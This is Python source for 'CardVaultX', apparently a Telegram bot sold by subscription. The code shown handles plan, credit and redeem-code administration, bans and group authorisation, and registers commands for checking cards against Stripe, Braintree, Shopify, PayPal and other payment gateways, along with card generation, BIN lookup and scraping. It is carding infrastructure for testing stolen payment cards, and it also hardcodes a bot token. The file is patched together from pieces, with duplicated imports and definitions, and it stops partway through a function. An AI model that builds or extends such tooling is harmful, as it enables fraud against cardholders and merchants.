        f"{authorized_groups_str}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 \\(Private Plans\\) 』━━━╮\n"
        f"{authorized_users_str}"
    )

    await update.effective_message.reply_text(
        admin_dashboard_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )



async def _update_user_plan(user_id: int, plan_name: str, credits: int, duration_days: int = None):
    """Updates user's subscription plan and expiry."""
    plan_expiry = 'N/A'
    if duration_days:
        expiry_date = datetime.now() + timedelta(days=duration_days)
        plan_expiry = expiry_date.strftime('%d-%m-%Y')

    await update_user(
        user_id,
        plan=plan_name,
        status=plan_name,
        credits=credits,
        plan_expiry=plan_expiry
    )

    AUTHORIZED_PRIVATE_USERS.add(user_id)

    # Re-fetch updated user data if needed
    user_data = await get_user(user_id)
    return user_data


from datetime import datetime, timedelta
from telegram.constants import ParseMode

PLAN_DEFINITIONS = {
    "starter": {"name": "Starter Plan", "credits": 300, "days": 7},
    "premium": {"name": "Premium Plan", "credits": 1000, "days": 30},
    "plus": {"name": "Plus Plan", "credits": 2000, "days": 60},
    "custom": {"name": "Custom Plan", "credits": 3000, "days": None},
}

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


from datetime import datetime

async def give_starter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_starter [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Starter Plan', 300, 7)
    await update.effective_message.reply_text(
        f"✅ Starter Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user info and send congratulation
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Starter", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`", parse_mode=ParseMode.MARKDOWN_V2)

from datetime import datetime

async def give_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_premium [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Premium Plan', 1000, 30)
    await update.effective_message.reply_text(
        f"✅ Premium Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user details
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Premium", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


from datetime import datetime

async def give_plus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_plus [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Plus Plan', 2000, 60)

    await update.effective_message.reply_text(
        f"✅ Plus Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user's name
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Create and send congratulations box
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Plus", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

from datetime import datetime

async def give_custom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_custom [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Custom Plan', 3000)

    await update.effective_message.reply_text(
        f"✅ Custom Plan activated for user `{user_id}` with 3000 credits\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Get first name for congrats message
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Generate & send congratulatory message
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(
        user_id=user_id,
        plan="Custom",
        access_level="KILLER + TOOLS",
        date=date_str,
        first_name=first_name
    )

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


async def take_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's current plan and revokes private access."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text("❌ Invalid format\\. Usage: `/take_plan [user_id]`", parse_mode=ParseMode.MARKDOWN_V2)
    
    try:
        user_id = int(context.args[0])
        user_data = await get_user(user_id)  # ✅ FIXED: was `user.id` before (wrong variable)
        
        # Reset plan and credits
        user_data['plan'] = 'Free'
        user_data['status'] = 'Free'
        user_data['plan_expiry'] = 'N/A'
        user_data['credits'] = DEFAULT_FREE_CREDITS
        
        # Persist the update
        await update_user(
            user_id,
            plan='Free',
            status='Free',
            plan_expiry='N/A',
            credits=DEFAULT_FREE_CREDITS
        )

        # Remove from private authorized users
        AUTHORIZED_PRIVATE_USERS.discard(user_id)

        await update.effective_message.reply_text(
            f"✅ Plan and private access have been removed for user `{user_id}`\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )


def generate_congrats_box(user_id: int, plan: str, access_level: str, date: str, first_name: str) -> str:
    from telegram.helpers import escape_markdown
    return (
        f"╭━━━[ 🎉 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐬, {escape_markdown(first_name, version=2)}\\! ]━━━╮\n"
        f"┃\n"
        f"┃ ✨ *Access to* ⚡ `𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝑿` *has been granted\\.*\n"
        f"┃\n"
        f"┃ 🆔 *𝙄𝘿*             : `{user_id}`\n"
        f"┃ 💎 *𝙋𝙡𝙖𝙣*           : `{plan}`\n"
        f"┃ 🧰 *𝘼𝙘𝙘𝙚𝙨𝙨 𝙇𝙚𝙫𝙚𝙡*   : `{access_level}`\n"
        f"┃ 📅 *𝘿𝙖𝙩𝙚*           : `{date}`\n"
        f"┃ 🔓 *𝙎𝙩𝙖𝙩𝙪𝙨*         : `✔ Activated`\n"
        f"┃\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━╯\n"
        f"\n"
        f"💠 *𝕎𝕖𝕝𝕔𝕠𝕞𝕖 𝕥𝕠 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧* — 𝙉𝙤 𝙡𝙞𝙢𝙞𝙩𝙨 𝙅𝙪𝙨𝙩 𝙥𝙤𝙬𝙚𝙧\\.\n"
        f"𝙔𝙤𝙪’𝙧𝙚 𝙣𝙤𝙬 𝙖 𝙥𝙧𝙤𝙪𝙙 𝙢𝙚𝙢𝙗𝙚𝙧 𝙤𝙛 𝙩𝙝𝙚 *𝗘𝗹𝗶𝘁𝗲 {escape_markdown(plan, version=2)} 𝗧𝗶𝗲𝗿*\\.\n"
        f"\n"
        f"🍷 *𝓣𝓱𝓪𝓷𝓴𝓼 𝓯𝓸𝓻 𝓬𝓱𝓸𝓸𝓼𝓲𝓷𝓰 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧\\!* 𝙔𝙤𝙪𝙧 𝙖𝙘𝙘𝙚𝙨𝙨 𝙞𝙨 𝙣𝙤𝙬 𝙤𝙥𝙚𝙣\\."
    )


async def auth_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorizes a group to use the bot."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].strip('-').isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/au [chat_id]`", 
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    try:
        chat_id = int(context.args[0])
        if chat_id > 0:
            return await update.effective_message.reply_text(
                "❌ That is not a group chat ID\\. Make sure you provide a valid group chat ID that starts with `-`\\.", 
                parse_mode=ParseMode.MARKDOWN_V2
            )

        AUTHORIZED_CHATS.add(chat_id)
        await update.effective_message.reply_text(
            f"✅ Group with chat ID `{chat_id}` has been authorized\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid chat ID format\\. Please provide a valid integer chat ID\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )


import os
import asyncpg
from telegram import Update
from telegram.ext import ContextTypes

ADMIN_USER_ID = 7254736651  # Replace with your admin user ID

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /reset <amount_of_credits>\nExample: /reset 500")
        return

    new_credits = int(context.args[0])
    database_url = os.getenv("DATABASE_URL")
    if not database_url:
        await update.message.reply_text("❌ DATABASE_URL environment variable not set.")
        return

    try:
        conn = await asyncpg.connect(dsn=database_url)
        await conn.execute("UPDATE users SET credits = $1", new_credits)
        await conn.close()
    except Exception as e:
        await update.message.reply_text(f"❌ Database error: {e}")
        return

    await update.message.reply_text(f"✅ All user credits have been reset to {new_credits}.")


async def remove_authorize_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's private access and resets their plan."""
    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/rauth [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])

        if user_id in AUTHORIZED_PRIVATE_USERS:
            AUTHORIZED_PRIVATE_USERS.remove(user_id)

            # Update the user in the database
            await update_user(
                user_id,
                plan='Free',
                status='Free',
                credits=DEFAULT_FREE_CREDITS,
                plan_expiry='N/A'
            )

            await update.effective_message.reply_text(
                f"✅ User `{user_id}` has been de-authorized and plan reset to Free\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            await update.effective_message.reply_text(
                f"ℹ️ User `{user_id}` was not in the authorized private list\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

import re
import uuid
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Global redeem code storage (if not already defined)
REDEEM_CODES = {}

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)

async def gen_codes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates 10 redeem codes for the Starter Plan."""
    generated_codes = []
    for _ in range(10):
        code = str(uuid.uuid4()).replace('-', '')[:12].upper()
        REDEEM_CODES[code] = {
            'plan_name': 'Starter Plan',
            'credits': 300,
            'duration_days': 7
        }
        generated_codes.append(code)

    code_list_text = "\n".join([f"`{escape_markdown_v2(code)}`" for code in generated_codes])

    response_text = (
        "✅ *10 new redeem codes for the Starter Plan have been generated:* \n\n"
        f"{code_list_text}\n\n"
        "These codes are one\\-time use\\. Share them wisely\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeems a code to activate a plan."""
    user = update.effective_user
    user_id = user.id

    if not context.args or len(context.args) != 1:
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/redeem [code]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    code = context.args[0].upper()
    plan_details = REDEEM_CODES.get(code)

    if not plan_details:
        return await update.effective_message.reply_text(
            "❌ Invalid or already used code\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_data = await get_user(user_id)
    if user_data.get('plan') != 'Free':
        return await update.effective_message.reply_text(
            "❌ You already have an active plan\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Apply the plan and remove the used code
    plan_name = plan_details['plan_name']
    credits = plan_details['credits']
    duration_days = plan_details['duration_days']
    await _update_user_plan(user_id, plan_name, credits, duration_days)
    del REDEEM_CODES[code]

    response_text = (
        f"🎉 Congratulations\\! Your `{escape_markdown_v2(plan_name)}` has been activated\\.\n"
        f"You have been granted `{credits}` credits and your plan will be active for `{duration_days}` days\\.\n"
        f"Your private access is now active\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)


async def handle_unauthorized_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles commands that are not explicitly authorized for the user/chat."""
    # This handler is a fallback and can be used for logging or a generic message.
    pass

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a user-friendly message if possible."""
    logger.error("Exception while handling an update:", exc_info=context.error)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("❌ An unexpected error occurred\\. Please try again later or contact the owner\\.", parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Failed to send error message to user: {e}")

# 🛑 Users banned from using the bot
BANNED_USERS = set()


# === REGISTERING COMMANDS AND HANDLERS ===
import os
import logging
import re
from functools import wraps
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from db import init_db
from force_join import force_join, check_joined_callback  # import decorator & callback


# 🛑 Banned users
BANNED_USERS = set()

# 🔑 Bot token
BOT_TOKEN = "8408R0ge3iIz9aZjFcH44xA88M"

# ✅ Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 🚫 Unauthorized handler
async def block_unauthorized(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚫 This group is not authorized to use this bot.\n\n"
        "📩 Contact @blinkisop to get access.\n"
        "🔗 Official group: https://t.me/+EwCcMzxhQ6Y3MTQ0"
    )

# ✅ Restricted decorator (allow private chats + owner + check banned)
def restricted(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        chat_id = update.effective_chat.id
        chat_type = update.effective_chat.type
        user_id = update.effective_user.id

        # Check banned users
        if user_id in BANNED_USERS:
            await update.message.reply_text("🚫 You are banned from using this bot.")
            return

        # Allow owner, private chats, or authorized groups
        if chat_type != "private" and chat_id not in AUTHORIZED_CHATS and user_id != OWNER_ID:
            await update.message.reply_text(
                "🚫 This group is not authorized to use this bot.\n\n"
                "📩 Contact @blinkisop to get access.\n"
                "🔗 Official group: https://t.me/+EwCcMzxhQ6Y3MTQ0"
            )
            return

        return await func(update, context, *args, **kwargs)
    return wrapped

# 🧠 Database init
async def post_init(application):
    await init_db()
    logger.info("✅ Database initialized")

# 📌 Ban / Unban commands
async def rban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban a user from using the bot (owner only)."""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only the bot owner can ban users.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /rban <user_id>")
        return

    try:
        user_id = int(context.args[0])
        BANNED_USERS.add(user_id)
        await update.message.reply_text(f"✅ User {user_id} has been banned from using the bot.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please provide a valid number.")

async def fban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban a user (owner only)."""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only the bot owner can unban users.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /fban <user_id>")
        return

    try:
        user_id = int(context.args[0])
        BANNED_USERS.discard(user_id)
        await update.message.reply_text(f"✅ User {user_id} has been unbanned and can use the bot again.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please provide a valid number.")

# Shoopi Site#       
async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove Shopify sites - /remove"""
    user_id = update.effective_user.id
    
    try:
        # Get user data
        user_data = await get_user(user_id)
        if not user_data:
            await update.message.reply_text("❌ User data not found.")
            return

        # Get current sites (ensure it's always a list)
        current_sites = user_data.get('custom_urls', [])
        if current_sites is None:
            current_sites = []
        
        if not current_sites:
            await update.message.reply_text(
                "💔 <b>No Shopify Sites Found</b>\n\n"
                "You don't have any sites to remove.\n"
                "Use <code>/add</code> to add sites first.",
                parse_mode=ParseMode.HTML
            )
            return

        # If no arguments, show remove options
        if not context.args:
            # Simple message without buttons
            await update.message.reply_text(
                "🛍️ <b>Shopify Site Management</b>\n\n"
                f"📊 <b>Total Sites:</b> {len(current_sites)}\n\n"
                "🔹 <code>/remove all</code> - Remove all sites\n"
                "🔹 <code>/remove &lt;site&gt;</code> - Remove specific site\n"
                "🔹 <code>/mysites</code> - View your sites\n\n"
                "Example: <code>/remove https://example.com</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # Handle arguments
        if context.args[0].lower() == 'all':
            # Remove all sites
            success = await update_user(user_id, custom_urls=[])
            
            if success:
                await update.message.reply_text(
                    "✅ <b>All Sites Removed Successfully!</b>\n\n"
                    f"🗑️ <b>Removed:</b> {len(current_sites)} sites\n"
                    f"📊 <b>Total Sites Now:</b> 0\n\n"
                    "Use <code>/add</code> to add new sites.",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    "❌ <b>Database Error</b>\n\n"
                    "Failed to update sites. Please try again.",
                    parse_mode=ParseMode.HTML
                )

        else:
            # Remove specific site
            site_to_remove = " ".join(context.args).strip()
            if not site_to_remove.startswith(("http://", "https://")):
                site_to_remove = "https://" + site_to_remove

            if site_to_remove not in current_sites:
                await update.message.reply_text(
                    f"❌ <b>Site Not Found</b>\n\n"
                    f"<code>{site_to_remove}</code>\n\n"
                    "Use <code>/mysites</code> to see your current sites.",
                    parse_mode=ParseMode.HTML
                )
                return

            # Remove the site
            updated_sites = [site for site in current_sites if site != site_to_remove]
            success = await update_user(user_id, custom_urls=updated_sites)
            
            if success:
                await update.message.reply_text(
                    "✅ <b>Site Removed Successfully!</b>\n\n"
                    f"🗑️ <b>Removed:</b> <code>{site_to_remove}</code>\n"
                    f"📊 <b>Total Sites Now:</b> {len(updated_sites)}\n\n"
                    "Use <code>/mysites</code> to view remaining sites.",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    "❌ <b>Database Error</b>\n\n"
                    "Failed to remove site. Please try again.",
                    parse_mode=ParseMode.HTML
                )

    except Exception as e:
        await update.message.reply_text(
            f"❌ <b>Error</b>\n\n"
            f"<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
        
async def removeall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove all Shopify sites - /removeall"""
    user_id = update.effective_user.id
    
    try:
        # Get user data
        user_data = await get_user(user_id)
        if not user_data:
            await update.message.reply_text("❌ User data not found.")
            return

        # Get current sites
        current_sites = user_data.get('custom_urls', [])
        if current_sites is None:
            current_sites = []
        
        if not current_sites:
            await update.message.reply_text(
                "💔 <b>No Sites To Remove</b>\n\n"
                "You don't have any Shopify sites in your list.",
                parse_mode=ParseMode.HTML
            )
            return

        # Remove all sites
        success = await update_user(user_id, custom_urls=[])
        
        if success:
            await update.message.reply_text(
                "✅ <b>All Sites Removed Successfully!</b>\n\n"
                f"🗑️ <b>Removed:</b> {len(current_sites)} sites\n"
                f"📊 <b>Total Sites Now:</b> 0\n\n"
                "Use <code>/add</code> to add new sites.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "❌ <b>Database Error</b>\n\n"
                "Failed to remove sites. Please try again.",
                parse_mode=ParseMode.HTML
            )

    except Exception as e:
        await update.message.reply_text(
            f"❌ <b>Error</b>\n\n"
            f"<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )     
        
                     
                                  
                                               
                                                            
async def cmds_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Pagination handler for /cmds command"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data.startswith("page_"):
        try:
            page_index = int(data.split("_")[1])
            text = build_page_text(page_index)
            buttons = build_cmds_buttons(page_index)
            
            await query.message.edit_text(
                text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
        except Exception as e:
            await query.message.edit_text(
                f"❌ Error loading page: {e}",
                parse_mode=ParseMode.HTML
            )
            
                                      

# --- Helper to wrap message handlers so context.args is filled ---
# --- Helper to wrap message handlers so context.args is filled ---
def _make_message_wrapper(handler):
    """
    Return an async wrapper that:
    - parses the message text and sets context.args (like CommandHandler does)
    - then calls the provided handler (which might be restricted(force_join(func)) or plain func)
    """
    @wraps(handler)
    async def _inner(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        text = ""
        if update.effective_message and update.effective_message.text:
            text = update.effective_message.text.strip()
        elif update.effective_message and update.effective_message.caption:
            text = update.effective_message.caption.strip()
        else:
            text = ""

        tokens = text.split()
        context.args = tokens[1:] if len(tokens) > 1 else []

        return await handler(update, context, *args, **kwargs)

    return _inner


# 📌 Helper: Add commands with / and . (supports owner-only and restricted wrapping)
def add_dual_command(application, cmd_name, cmd_func, restricted_wrap=True, owner_only=False):
    pattern = rf"^[./]{re.escape(cmd_name)}(?:\s|$)"
    if restricted_wrap:
        base_handler = restricted(force_join(cmd_func))
    else:
        base_handler = cmd_func
    wrapped_handler = _make_message_wrapper(base_handler)

    msg_filter = filters.Regex(pattern)
    if owner_only:
        msg_filter = msg_filter & filters.User(OWNER_ID)

    application.add_handler(MessageHandler(msg_filter, wrapped_handler))




# ------------------ COMMAND REGISTRATION ------------------
# ------------------ COMMAND REGISTRATION ------------------
def register_user_commands(application):
    from telegram.ext import CommandHandler

    # Normal user commands - START KO PEHLE RAKHO
    user_commands = [
        ("start", start),                    # ✅ START COMMAND ADD KARO
        ("close", close_command),
        ("restart", restart_command),
        ("info", info),
        ("check", check),
        ("cmds", cmds_command),
        ("credits", credits_command),
        ("chk", chk_command),
        ("sr", sr_command),        
        ("st", st_command),
        ("st1", st1_command),
        ("mass", mass_handler),
        ("sh", sh),  # sh_command ko sh se replace karein
        ("hc", hc_command),
        ("at", at_command),
        ("add", add),
        ("mysites", mysites),
        ("py", py_command),
        ("msp", msp),
        ("removeall", removeall),
        ("b3", b3_command),
        ("gen", gen),
        ("open", open_command),
        ("adcr", adcr_command),
        ("ad", ad_command),
        ("bin", bin_lookup),
        ("broad", broad),
        ("rz", rz_command),
        ("fk", fk_command),
        ("vbv", vbv),
        ("pp", pp_command),
        ("gate", gate_command),
        ("mgate", mgate_command),
        ("hdgate", hdgate_command),
        ("oc", oc_command),
        ("fl", fl_command),
        ("status", status_command),
        ("redeem", redeem_command),
        ("rsite", rsite_command),
        ("chktxt", chktxt_command),
        ("scr", scr_command),               # ✅ Scraper command
        ("mc", mc_command),                 # ✅ Multi-channel scraper
        ("clean", clean_command),           # ✅ Clean command
        # ✅ SK BASED COMMANDS
        ("cc", cc_command),
        ("su", su_command),
        ("ps", ps_command),
        ("rps", rps_command),
    ]

    for name, func in user_commands:
        add_dual_command(application, name, func, restricted_wrap=True, owner_only=False)

def register_owner_commands(application):
    owner_commands = [
        ("admin", admin_command),
        ("give_starter", give_starter),
        ("give_premium", give_premium),
        ("give_plus", give_plus),
        ("give_custom", give_custom),
        ("take_plan", take_plan),
        ("au", auth_group),
        ("reset", reset_command),
        ("rauth", remove_authorize_user),
        ("gen_codes", gen_codes_command),
        ("rban", rban),
        ("fban", fban),
    ]

    for name, func in owner_commands:
        add_dual_command(application, name, func, restricted_wrap=False, owner_only=True)


# ---------- helper to register callback ----------
def register_mstripe_callbacks(app):
    app.add_handler(CallbackQueryHandler(stopchk_callback, pattern="^stopchk_"))


# ------------------ CALLBACK HANDLER ------------------
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles all inline button callback queries and routes them to the
    appropriate handler function.
    """
    query = update.callback_query
    
    # ✅ PEHLE ANSWER KARO WITHOUT TEXT
    await query.answer()
    
    data = query.data

    logger.info(f"Callback received: {data} from user {query.from_user.id}")

    try:
        # ✅ STEP 2: YAHAN YEH LINE ADD KARO ✅
        if data.startswith("removeall_"):
            await handle_removeall_callback(update, context)
            return
            
        # ✅ Check joined callback
        if data == "check_joined":
            from force_join import check_joined_callback
            await check_joined_callback(update, context)
            return

        # ✅ Commands pagination handler
        if data.startswith("page_"):
            await cmds_pagination(update, context)
            return
            
        if data == "close":
            await handle_close(update, context)
            return

        # Map callback data to the handler functions
        handlers = {
            # ✅ Tools Menu Handlers
            "tools_menu": tools_menu_handler,
            "tools_page_1": tools_menu_handler,
            "tools_page_2": tools_page_2_handler,
            # Existing handlers
            "gates_menu": gates_menu_handler,
            "auth_sub_menu": auth_sub_menu_handler,
            "charge_gateway_menu": charge_gateway_menu_handler,
            "stripe_auth_menu": stripe_auth_menu_handler,
            "braintree_auth_menu": braintree_auth_menu_handler,
            "auto_shopify_menu": auto_shopify_menu_handler,
            "sk_based_menu": sk_based_menu_handler,
            "stripe_charge_menu": stripe_charge_menu_handler,
            "authnet_menu": authnet_menu_handler,
            "ocean_menu": ocean_menu_handler,
            "adyen_menu": adyen_menu_handler,
            "paypal1_menu": paypal1_menu_handler,
            "paypal9_menu": paypal9_menu_handler,
            "razorpay_menu": razorpay_menu_handler,
            "back_to_start": back_to_start_handler,
            # ✅ Mass Gateway Handlers
            "mass_gateway_menu": mass_gateway_menu_handler,
            "mass_stripe_menu": mass_stripe_menu_handler,
            "mass_shopify_menu": mass_shopify_menu_handler,
        }

        handler = handlers.get(data)
        if handler:
            await handler(update, context)
        else:
            # ❌ PURANA: await query.message.reply_text("⚠️ Unknown option selected.")
            # ✅ NAYA: Inline alert show karo
            await query.answer("⚠️ Unknown option selected.", show_alert=True)
            logger.warning(f"Unknown callback data: {data}")

    except Exception as e:
        logger.error(f"Error in callback handler: {e}")
        # ❌ PURANA: await query.message.reply_text(f"❌ Error: {str(e)}")
        # ✅ NAYA: Inline error alert
        try:
            await query.answer(f"❌ Error: {str(e)[:50]}...", show_alert=True)
        except:
            pass
    
# ------------------ MISSING FUNCTIONS ------------------
# Yeh functions add karo jo missing hain

async def cmds_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle pagination for /cmds command"""
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("page_"):
        try:
            page_index = int(data.split("_")[1])
            text = build_page_text(page_index)
            buttons = build_cmds_buttons(page_index)
            await query.message.edit_text(
                text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
        except Exception as e:
            logger.error(f"Error in pagination: {e}")

async def handle_close(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Close button handler"""
    query = update.callback_query
    await query.answer()
    await query.message.delete()

def build_page_text(page_index: int) -> str:
    """Build text for commands page"""
    try:
        page_commands = PAGES[page_index]
        text = "━━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"<i>◆ 𝐂𝐌𝐃𝐒 𝐏𝐀𝐆𝐄 {page_index + 1}/{len(PAGES)}</i>\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        for name, cmd in page_commands:
            text += f"<b><i>Name:</i></b> <i>{escape_html(name)}</i>\n"
            text += f"<b><i>Use:</i></b> <i>{escape_html(cmd)}</i>\n"
            text += f"<b><i>Status:</i></b> <i>Online ✅</i>\n"
